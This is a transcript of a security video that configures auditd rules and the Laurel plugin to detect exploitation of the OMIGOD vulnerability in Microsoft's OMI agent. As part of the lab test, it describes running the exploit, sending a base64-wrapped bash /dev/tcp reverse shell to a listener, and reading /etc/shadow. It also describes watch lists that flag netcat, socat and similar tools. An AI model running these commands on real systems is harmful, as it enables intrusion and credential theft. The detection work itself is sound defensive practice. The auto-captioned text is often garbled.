 what's going on youtube this is ipsec and i want to do a follow-on video to my last one about exploiting oh my god but this time detecting it for the blue team essentially this video is just going over like audit d101 on how to build a good audit d profile so you can actually detect a lot of things much more than just this exploit such as like a user getting a permission denied going into someone else's home directory that's something you should get notified on and this is how you can do it at the end of the video we're gonna go over a plugin for audit d called laurel and what that does is it converts the audit d multi-line log format into a single line json format which a lot of seams and just log event tools love having so with that being said let's jump in my setup for this video is going to be super basic i just have team ux running and two panes the first pane is my attack pane where i just installed the omigod exploit that i'll run when i'm ready for it but there's no point in running it now because i already did my last video and this is picking up where that left off in this pane is my defend pane i'm just ssh into the box where i installed the open management infrastructure application omi if you want to do that yourself just go to the like playing with exploits oh my god video where i install all this but the first thing we want to do on this box is configure logging correctly so i'm going to switch over to the root user i'm going to install audit d and there's a few ways to get the logs that would detect this type of attack we could install snoopy which i've done before in the battlegrounds video but that operates as a ld preload root kit to kind of get logging it's a super janky hacky way to get command line logging that probably is easily available audit d is a kernel module so it's going to be a lot harder to evade and also gives you a lot more information and i think there's also sysmon for linux but i don't know if that's actually out yet and when it does come out it'll be super new so you may still want to do audit d because that's the tried and true fashion application to do this and also microsoft may stop support for it randomly i'm still salty about them announcing their killing support for hyper-v but that's a whole different topic let's get back to rd so we just installed it all the configuration is in etsy audit and the main thing we want to do is this rules.d file this is going to be like your sysmon rules and out of the box it is super bare uh the first rule is deleting all previous rules and then we do some configs so just like sysmon instead of going for like swift on security we're going to go to um i want to say it's forney and roth's page so i'm just going to google audit the github and see where this brings us right here best practices for audit configuration this is probably the best starting out point that i know of and his file starts off the same way as the default one so all i'm going to do is copy audit.rules or delete audit.rules and w get the new copy so we can look at this in vim and see exactly how it works ignoring these first few rules because it's not really that important and then we see a bunch of arguments it's kind of operating like iptables like if you just do iptables-save uh maybe i have to do sudo oh my god uh i don't have any iptables rules but it just runs auditctl with all these parameters constantly to regenerate so like all it's doing is taking every line doing audit ctl and then putting this at least that's how i think it's working but um these rule files are super easy to read the dash w is going to be specifying a file or directory and dash k is like a tag um let's just go over to google and we can say audit d rules and find a man page that will talk about them i want to say we want to go to audit ctl yep so if i do dash k that's just talking about the key and this is just again like a tag at least i think of it like a tag because when it comes to searching rules i can search for audit log and i get all the art events related to this the dash w this can be path it's just watching over something so the very first thing he does is watches over this verilog audit and anything that accesses it he gives it the tag audit log and we can take a look at that directory so ls4 log audit and if i just cap that file it's just the audit d log which is super hard to read we'll go into using tools to read this in a few minutes but first let's continue processing it so we're watching over all the audit logs and then this audit d configuration watching over directories a file in another directory and he has a dash p flag here and since these are just um configuration files he's not really interested in reads so the whole key thing about this is logging the minimal amount of vents while still being useful because you just don't want to log too much because if you log too much you just start spinning your wheels it's either like cost too much because the cost of storage you're just logging too much so it's finding a needle in a haystack you only want to find what's relevant so the dash p flag is for permissions and you can specify read write execute or a which is attribute change so if you change the file from like read-only to writable then dash a would um make sure that log is shown so here we're just looking for someone writing to etsy audit lib audit or audit sp or rdsp this is where the plugins for audit d come in and we'll look at a work in progress plug-in at the end of the video but again just looking for anything writing to those configs or changing the attributes which could probably break auditing so that's why he wanted to watch it then we have the dash w flag again looking at a few specific binaries audit ctl audit d and then a u gen rules and this time he only has the dash p x and this is just looking for these binaries executing and if they do it's going to assign it to tag audit tools so then we have filters and this is going to probably just exclude a lot of things so avc this is access vector cache of sc linux not sure exactly why he's excluding it probably just because it generates a lot of noise and is already logged in the se linux logging and there's no reason to log something twice especially when sc links probably does it better so just excluding all those logs then he's also excluding anything of the message type cwd i'm guessing this is um related to just noise he doesn't want to print the working directory of every single logging event but sometimes it is nice later on this video we're gonna look at logging the exec ve sys call directly and because then of this line we'll never get the current working directory where exec ve is which is just a system command i don't know of a way to bypass it like we could specify dash s and then exec v e and say like exclamation point to do not but that doesn't work in audit ctl and then i also try like dash a always instead of exclude to do include and then specifying um exec ve this way but and then hits like it passes this to say always including this argument and then it gets down to this line and says oh i'm just going to exclude it so the log file is not like support boolean logic things like that it's very basic uh this one end of record probably just noise uh cron tab again he just probably is filtering out noise doesn't need to log every like time a cron entry runs uh c8 ronnie this looks like it is a ntp thing again just a noisy application i don't know exactly what cryptokey user is but it generated a lot of login alerts especially if it's public facing so maybe it just outputs a bunch of like crypto parameters like the ciphers of people connecting to your server which if it's public facing that's going to be a lot of things because you're just going to log a bunch of crypto stuff from bots and it's not extremely useful the next one is vmware tools vmware tools itself is a very noisy application sometimes it does generate good logging events because if you have vcenter you can use the power cli or whatever it's called to do like an invoked guest command which will use vmware tools to execute a command i don't think we'll see it because we're excluding it but the amount of logging things that vmware tools creates is just so high it's one of those like do you want to have thousands of events for something small that is a very edge case that you'd probably get logging elsewhere probably not so that's why he excludes it don't know exactly what this is it looks like it's just um when two processes are talking to each other and this dash a we can look at dash a actually i realized we did not go back to it but dash a is just going to be a list action and then what you want to do let's see i realize that wasn't too helpful what are possible things if i search exit so i think the list can be task exit user or exclude there should be one for include i thought i don't know why include is not here see we'll get down later maybe there is maybe exit maybe exit is include that's probably it add a rule to this is called exit list yeah so if you want to include something most the time it will be exit and then following describes the valid actions either never or always so um just ignoring these syscalls or directories so kernel parameters we're watching over says ctl.com write attribute change adding it to ctl kernel module loading and unloading of kernel modules mod probe looking at just modules k exact special files so looking at mk nod or mk no dat i'm not sure exactly what that is we could probably just do man mk nod probably make node or something make a blocker special character or special file i wonder why like um mkf if that's not there or maybe this application um uses that syscall i don't know exactly but going through it if you want if like you do something like if if you wanted to log this mk fifo command and you don't see it then this is the area i would be looking at and we can probably try this at the end so that would be special files um let's see the notes log special files mk fifl so now for me to come back to that once we have this all set up so mount operations login when something's mounted change of swap time s tunnel cron this is just looking for new cron jobs a good way to persist on linux machines so grabbing all those um anytime a user is added or changed or a password change so he's looking at group passwd g shadow shadow and i don't know what opass wd is probably some red hat thing uh sudoer's file change again passwd change and you see like well this one's only looking at execute so up here we're going to get a password change by just watching this um etsy shattered file and then here we're going to log the actual um command that did it so watching past the bd looking at the executable bit and tagging it past wd modification tools to change log configuration network events so you can see tons of good information here changes to other files so just looking at etsy host network file network manager changing issue i'm waiting to get to the stuff i found super interesting related to pam mail ssh configuration system d um critical elements access failures i don't know exactly what that is so this is logging all the times a user switches accounts so um when i did the sudo the su command all that stuff would be logged here looking at the su binary the permission of execute permission of execute looking at sudoer's read write and again we looked at pseudoers before um if we go up here but here it's just looking at like tagging at actions and watching the um [Music] file and here we're doing the same exact thing but tagging it as a private so um there's benefit to doing both just so when you're searching for like potential things if you're just looking at like a admin granting someone else access i mean you may just look at that previous tag of actions but if you are um investigating a malware thing you may be thinking oh i need to check this prives filter lastly they are slightly different the permission for this is just read write if we look at the previous tutorials it is right attribute so they are logging slightly slightly different things but for all intents and purposes they're pretty much the same just different tags looking at power state session initialization this is modifying the discretionary access control if it's not a um wait is this not user if effect i wonder i guess that's audit id i know what auid is is greater than or equal to a thousand so this will um only look at actual users if you're root doing these things it's not going to log because i'm assuming auid would be zero in that case so that's a good way in linux to exclude all system accounts is just say hey if it's less than a thousand because uh that's notes if i cat etsy passwd we can see my user starts at 1000 and all the other uids are system accounts and they are below 1000 so pretty cool way to detect that and here is where we start getting interesting so now we're just looking at the binaries who am i id hostname you name issue these are files so etsy issue and etsy hostname and then tagging it recon because the first thing you do when you get on a box is do like a who am i or id um normal users don't really use those commands that much in my experience but applications may but that's why it's just tagged recon so if you ever suspect a compromise you can just do like an au search and search for reconnectivity and then kind of base your things off of that right after it there is suspicious activity which is just a lot of binaries that probably aren't used that often um get curl like we use it when we're downloading packages but on a normal day-to-day linux server probably not executing these base64 definitely not using that often netcat definitely not ssh scp like setting up tunnels copying files off this is like x filling files socat wireshark t-shirt raw shark i don't know what raw shark is our desktop like um remote desktop for linux uh maybe cert add like x-free rdp in here if that's actually installed on anything uh we have nmap so this is something i would recommend looking at and adding more binaries to because there's definitely a lot um specific ones for ubuntu nc.openbsd and nc.traditional um i want to say the main difference between these two is i don't think openbsd has the um is it c to execute a command and traditional may um but that's off top my head not exactly sure why there's two then we have s been suspicious activity just like iptables ifconfig eb tables i don't know what eb tables is uh nft tcp dump trace route so one thing you may want to add in here is like ufw because a lot of the modern linux things are moving away from ip tables and going towards ufw so oh wait ufw is here he's already got that i was thinking maybe he didn't have this because this um is like three years old but nope he hasn't so let's move on uh debus send may indicate privilege escalation and if you're curious i think there's actually a video i have of dbus or ipsec dot rocks we can just search for dbus and yeah i would recommend watching these videos if you're curious about this injection so looking for a process injection if you wanted to test these out i'd run like meterpreter and try doing injection from that it uses the p-trace syscall so that's why it's on this uh dash capital f i don't know what dash capital f is we can look at that certainly the rule name starts with dash f i'd have to look more into this i think this is like um field maybe argument zero equals zero x six so if we looked at the p tray syscall uh petraeus this call i could just done man p trace and looked at what um arg0 is where is it come on see 0x6 so that's sig trap not sure i'd have to look more into p trace so it's looking for code injection data injection register injection so this is definitely how p trace is attaching to something most likely and there's two of them because one is 32-bit the other is 64-bit and then we have just running p-trace by default it's enabling tracing uh privilege abuse so this is looking at any time an administrator is going into a user's home directory uh looking at rpm dnf i think that's a firewall that's like ufw for red hat package managers for susa or suse i don't know what how it's pronounced apt for debian python pip gds so this is special software this is looking at puppet stuff ibm bez client i want to say this is like blackberry enterprise i think that's what bez is and it's looking at just anything this application um let's see always exit and then looking at architecture 64-bit syscall open dash f i want to say anything this application is opening he is logging it maybe because this list is on the edge of a network and accessed by anyone so you just want extra logging around this application uh chef another devops tool a bunch of docker things cubelet and then this is anything that is executed by root so this is that exec ve call that i mentioned earlier so anytime the effective user id is 0 for both 64 and 32-bit tag it root cmd file deletion event so this is anytime a non-root or non-system user deletes a file unauthorized access this is a lot so this is the syscalls you can specify multiple so create open open that open by handle truncate f truncate um yeah bunch of them unsuccessful file creation so when someone's trying to create a file and it fails log it uh api exploitation and that's it there was one that i wanted to talk about but i didn't see it oh right here critical element access failure so this is another good one i'm not sure if i talked about it but anytime someone does a open command on any of these directories and the success is zero so it failed give it unauth file access so it's talking about um like if i try to access someone's file and slash home and i couldn't log it and then there was a dot ssh one that i think i did not talk about yeah looking at any like ssh key tampering so slash root dot ssh write or attribute change give it root key i want to say like i don't know if it's possible but it'd be cool if you could do like dash w um authorized keys because i don't think you can do this but just watch any file that is called that but yep that'd be something you should look into in the future and if um sysmon for linux comes out i think it'll have things like that which just gives you better granularity on creating rules but now that we know all about audit d um let us just restart it so service audit d restart i think we could do like the kill hub command to also restart it but this is how i like doing it just restarting the whole service and we can um get a shell real quick so let us oh we probably also whenever you restart it you have to restart the services so let's restart omid when you make changes to auditing it's generally good to reboot the box but i'm lazy i'm just going to restart the application i want and then let's nc lvmp 9001 and get ourselves a reverse shell so python 3 or my god dash t 192 168 30. 136. that's c id verify we have way to execute code and then let's do bash dash c bash dash i dev tcp what is my ip address 192 168 30 129 9001 like this there we go i need to end the double quote and we don't get a shell it's probably a lot of like bad characters so the way i'm gonna get around the bad characters is copy this and we're gonna do echo dash n paste it and then base64-w0 to copy just the base64 and now we can go back to the rce and just say echo dash m paste this pipe it over to base 64-d and then pipe that over to bash and we have a root shell so i'm just going to echo please subscribe and then we'll touch slash tamponed and cat etsy shadow so we did a few actions so we should be able to go to our logging now and if we do um let's see hey you oh wrong pane right here if i do a you search and then dash k root cmd we can see commands that are executing by root right now we have one right here this is exec ve call and argument one is cat or yeah argument zero which is one is cat this is the binary and then argument one is etsy shadow or the second argument the one annoying thing about this log is it's very like position dependent and space delimited and by that i mean um fields that are going to have a space it's going to hex encode so if you send it to a seam or something you have to make sure it's doing some type of processing because this is just a bunch of hex that will reverse into the command so let's see we can just go to cyber chef and i know i could use the like xxd tool to reverse it but i definitely always like showing off cyber chef whenever so we can say hex so we can say from hex and we can see it's cat etsy shadow if you are going through the command line and you want to have it auto process that we can do the dash i flag and it won't do that hex encoding so you can see proc's title is cat etsy shadow we also see touch temponed and let's see what else do we have we don't have the echo actually so what i'm going to do is look at this we see the parent process id is 5022 and the pid is 5035. um the pid is changing so this is the cat command this is only one event if we look at the um touch command it is 5034 but they both share the same parent because that parent is going to be bash if i do a ps ef is it tree um what is it forest i think it actually is two dashes whoops that's an equals there we go so we should have the bash shell and we can see the parent is 5022. i think that's what we saw you can see here's the omi agent the echo command definitely looks shady bash than bash but let's go back to the search i'm going to say p 5022 and actually probably pp for parent process and this will show us everything that's happening so i'm going to do is grep uh dash o capital p proc title dot star to grab like match everything after proc title and we can see it ran groups less did some dur colors dash b and here's the touch and cat command we can see it didn't do echo and i think that's because echo is a built-in bash thing so if i help help it probably won't find any of these commands that are here so like pwd um dirs echo enable probably won't flag these because there's a built into bash but it should get anything else um the other flag which was cool um instead of root cmd we could do like susp underscore activity and here's all the suspicious activity on the box uh we probably should have that dash i flag i'm just going to put that at the start so i stopped erasing it uh base64-d we see it running um audit ctl is flagged but definitely can see just us doing that reverse shell would have triggered an alert but anyways let's get back to the root cmd so where is that root cmd-i and i'm just going to look at all the proc titles let's do proc title equal so that's log rotate log rotate their colors there's my touch i'm looking for our initial access is this it proc title right here so this is my initial access so let's go over this with the fine toothed comb proc titles ben sh echo dash n the base64 decoding it and sending it over to bash we can see type path and i don't really see anything interesting here we do have the user root so that's why it's logged let's see what is different here this is just executing sh here's the exact ve call and then this audit so it is success equals yes so it exited successfully but what brought me to looking at this logging in particular is cyber wardog a pretty awesome blue teamer had put out some detection and i was trying like i saw it i was like oh my that's like the detection i do on windows but on linux how do i do this and it's essentially what sent me down this whole rabbit hole and made me decide i should do a video on this but here's his detection for oh my god he's looking for a syscall exec ve uid 0 when the current working directory is in this ver opt microsoft scx temp so and the command is sh so what we're missing is this cwd flag and if we go back to the config remember i was talking about it is actually excluded so if i wanted to we can go up here where is the config comment this out so we have cwd events and the one thing i didn't mention if we uncomment this it's gonna make the config immutable so i don't think you can change audit d without a reboot but definitely don't want that because we're making changes to it let's restart both rmi and audit d and then run this attack again so now we're listening send the shell go into a defender and do this audit search on root cmd uh doing it here the reason why i'm avoiding doing my audit searching on this window is because this is root and if it's root then all the commands i type here will also go into this au search thing because i'm looking at root command but if i'm just using ipsec user it's not root user so it's not flagging all those commands so let's see der colors less pipe here we go we can see oh that's less it's not it well it's part of the shell but not the shell itself i wonder if i can just search for base64 if we don't find it here here we go so here we go proc title dash c um and we have the current working directory var opt microsoft sex temp so if i was using elastic gray log splunk insert your log analysis thing i would definitely want this cwd thing and the main reason i want it is i probably wouldn't have this whole path coded because i didn't know about this like microsoft was installing this agent without telling you so you wouldn't know that exists but i definitely would have something that looks for tmp and the cwd and executing oh command because typically binaries aren't in temp directories so if you just had that safety rule of looking at hey anything executing inside a directory called temp then you would have found this but even if you don't have an alert for it the log is still good because when this post comes out it would be nice to go through all your logs and be like hey has anyone exploited this on us before so um definitely should install audit d on all your linux servers and at least do this basic um config but that's probably going to be about it for this actually uh there was the one thing we wanted i want to look at mk fifo so why do i want to look at that that was some special thing let's see let's go back into the rules special no special files so i'm going to do is mk fifo temp type and all i want to do is search so let's do that au search do it here was it special you can see how good my memory is sometimes files and mk fifo is using the mknod syscall we can see it right here and the reason why i highlighted this is if you look at reverse shells so let's do reverse shell cheat sheet it's used on a lot of things pen tester monkey so if you don't have bash a lot of people will fall back to this one where it's using named pipes to do everything so that would definitely catch this use of a reverse shell also if um you watch one of my videos that uses a ford shell just go here type it watch one of these videos it would also um detect these because converting the forged uh shell with mk fifo so i love using that file and i'm glad to see it uses this syscall so it was detected already by floyd roth and i mean he probably even know i use those commands but because he has detections at such a basic level it picks them up so the very last thing i want to do with this video i know it's getting longer than i expected i was like oh we'll do a quick 10 minute video and here i am probably like a half hour later um typically how it goes with all my videos but there was a plug-in that someone mentioned on twitter that i was really excited about but i don't know if it's me or it's just not ready yet i see it's being heavily used this laurel program and it's going to convert the audit into a json which would be super duper awesome because the main issue i have whenever i analyze audit d like in a same that's not like built to handle it is uh just the multiple lines like this one thing is one two three four five six six different event like six different lines and most seams are built to only handle things one line at a time when you get into multi lines it becomes a huge pain and that may be why the end of event thing is in audit d but we exclude it because it's creating too much noise is so when the scene gets the start of an event it can get the end event and then process the whole thing maybe that's why that end of event line exists but hopefully this will just fix everything and as i say that i have one idea maybe we can solve an issue live in this video which would be cool where is it moving command line is it a closed one kafka provide binaries no missing missing type in events so this person is using it and they're doing a jq to analyze the logs and these are the only message types they're getting and if they use audit d here's all the message types that exist in that log the key one they want and the key one i like is this exec ve and we can see laurel isn't working with it maybe if i uncomment that um end of event thing maybe it will process it i was talking out of my head like oh that may kind of actually make sense but let's go install this and then examine that bug and then we can see if we can fix the bug so i'm just going to clone this if we look at the installation instructions it is built in rust so if i try to execute this my os is going to yell at me and say hey you need to either use rust up which is in snap or cargo so i'm going to do app install cargo yes and then the next thing we'll run is this so let's just wait for this to install and now that it's done installing or actually 99 thought it would be done uh we can do the next command come on which is this pseudo install wait oh no we still want to do the build release and then we can do the next one um we're just installing rust so we could use this cargo command so it's fetching it and then we will be installing compile i don't think it takes too long and it's almost done last package then we can run the final command to get this running and oh it errored cannot find so ld dash lacl so it's trying to link acl um app search is it lib acl dev maybe just acl div there we go wait i don't think that's it app install acl dev libertrib lib acl1 okay i don't know what i didn't find in the search but it looks like it's installing let's try this cargo command again to build and oh nice it just left off where like it started where it left off i was expecting it to have to build all the previous like 53 things before it aired but no rust decided to save me time and started at 53. thank you so now we can install it and then we want to create the users oh um we could have just used the binaries so always helps to read all the instructions first and then go back but oh well so let's create this home directory then we want to copy the provided example into etsy laurel config.tamil so cd here maker that and then we want to v config.toml let's copy this config i could have like w get it but i did this way so i can read it paste this read users we're not using splunk so i'm just going to put it as me so ipsec can read these logs so base name for it audit.log when to rotate and bytes generations i don't know oh so keep 10 different files and then the user that can read it and dropping the privilege to this user so we don't run as root the whole time also where to install the log or write the log the directory so let's go to the next one it wants us to go into this directory and this is the audi sp directory and we want to edit laurel.conf and give it this file let's see what this is active yes direction out so writing a log type always write string here's the binary and the arguments pointing the config to the file we just wrote okay that makes sense let's see which laurel it's in the directory it says i was just making sure it was user local spin laurel that looks good and then the final command how do we run it just wants us to run that pkill dash hump so let's run this and then we can go do the attack again so if i netcat run it we got a shell let's do id and i get over here if i do vero log laurel if i cat this it is all the json but there's not much logging at all so we just have these two entries so that's why i was a bit disappointed and kind of why i did in these videos because anyone that's familiar with this application can correct me so we can um get a better video out about this application because having this would be amazing but it's possible that it's just not in there because it never sees that end of event rule so let's go back up here and where are we excluding filters so se linux definitely not can be the culprit but this eoe record that may be it actually service mid restart sure let's do audit d start this up again and then what do we want to do oh we just want to cat ver log laurel and audit.log oh my god i think i just did that live in a video don't get too excited yet um apt install jq i'm using jq so i can quickly process this but i think we have it so audit rules audit rules i'm just going to look at base64 oh we may not have it let's run the commands they did in this get let's see what is it threat hunters issues missing message types so run this no we do have exact ve let's see oh um yeah so exec be so this is the jq command there is cat run parts dash so this could be it id syscall so 59 is exec ve oh no um that's cron head dash 20 unique dash c jq oh i'm going through um my actual uh command to do jq so this is why i was not using the root user to look at things like this snap this is deleting a file chmod move python python python python python python python python oh my god so many pythons so i'm going to restart audit d and omi again because because it got that exact ve makes me think it may be good um let's see touch tamp pound let's see what we get in these logs and we can probably do it from a low priv user so var log laurel cat audit jq dot bash dash i tap pwned so that looks good see why did it create that log cwd so we are getting it so that is the bug why didn't log before maybe i didn't restart it and i had to restart omid maybe it was like rolled over into the dot one but yeah if you wanna use this application just make sure your end of event is uncommented so this will be much happier and seems well i'm really glad i did that video because i solved my own problem but um i guess the last thing we can do is look at our logging let's see let's do less audit and audi sp so if i look at the this um thing we should see ourselves installing this plugin so au search dash k and here we go we are installing the plugin here with these login entries um i guess before i end it we can show a you report which i don't use too often i think it's actually in a hack the box machine so i probably explained this before a you report yeah it's in the academy box but you can do cool things like dash dash aureport-summary and get a system summary of just all the events on your box if you're just looking for things suspicious like we have one authentication three users 10 terminals 93 executables 97 commands uh a lot of failed syscalls so i would probably be looking for failed syscalls to see exactly what is not working um typically you don't want to have failed cis calls so something is airing out and i just don't know it uh there's also like a report dash i dash x summary and this is going to list all the executables so dash x is executable and dash dash summary is just summing it up and it's doing a sort by default to just show me the number of times each application ran we can see d package ran 29 579. if i had a guess some of this failed syscalls are probably d package just um not having permission a file not existing or something benign but it's probably why we have get running bash pearl just a lot of things running on this box if you don't want summary you can get rid of that dash x and it'll list like the time and everything um see if i just do a report-i what happens not exactly sure i'm not a big like um fan of this tool i normally just use au search but most of the time i forward all my logs to some type of seam and then analyze it there or i will go into the log itself so if i go dot audit and if i want to just look at logs i may just less it and see how it looks we had a lot of syscall failures so i'm just going to look for success we can see success equals yes or success equals no uh we have success equals no on this one that is interesting so apt check is running a command as root because syscall 59 is exec ve you can do aussis call and then type the number and we'll say what syscall it is so if we want to look at syscall number one that's a right number two is open 59 is exact ve so my apt right here or i say oh yeah it is apt is executing python 3.8 and it had a failure so we may want to look more into this but not sure exactly why that syscall failed we could also just grab success equals no and see everything so we have some 84 82 so we can look at those a you syscall let's do 84 rmdu 82 is rename so d package i say d package because right there is failing to do some things so success equals no let's see audit i wonder if i can just grep for this no that's a time stamp these messages should have some unique identifier i thought or you could just look at it that's aunt log4 five two two let's see we can do a you search dash k delete we may want to do dash i as well and this may give us more information so letting this run let's look at success equals now here's one so proc title rm f var lib update notifier this temp file so i'm guessing this temp directory maybe didn't exist i don't know exactly why it failed to delete but you may not care because this is just d package i believe verlib yeah so syscall unlink and the reason why is no such file or directory so it tells us why there again this one's no such file or directory no such file or directory so looks like a lot of times d package is doing things um it's attempting to delete a file because the package has reference that the file may exist but the file doesn't exist so the syscall fails so when looking at all those high numbered syscalls i'd go and remove d package app things like that and then see if there's any other syscall failures but i'll leave all that logging exercise to you because this was mainly just detecting oh my god being exploited and i think we did that so take care guys and i will see you all later